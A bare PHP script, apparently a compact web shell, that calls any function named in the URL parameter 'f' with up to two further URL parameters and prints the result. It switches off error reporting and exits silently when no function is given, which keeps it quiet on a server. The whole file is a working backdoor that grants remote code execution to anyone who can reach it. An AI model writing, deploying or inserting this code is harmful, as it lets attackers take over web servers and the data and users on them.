<?php 
error_reporting(0);
if(isset($_GET['f'])){}else{die();}
if(isset($_GET['p1'])){$flag_p1 = true;}else{$flag_p1 = false;}
if(isset($_GET['p1']) and isset( $_GET['p2'] )){$flag_p2 = true;}else{$flag_p2 = false;}
if($flag_p1 === false and $flag_p2 === false){print_r($_GET['f']());}
if($flag_p1 === true and $flag_p2 === false){print_r($_GET['f']($_GET['p1']));}
if($flag_p1 === true and $flag_p2 === true){print_r($_GET['f']($_GET['p1'],$_GET['p2']));}
?>
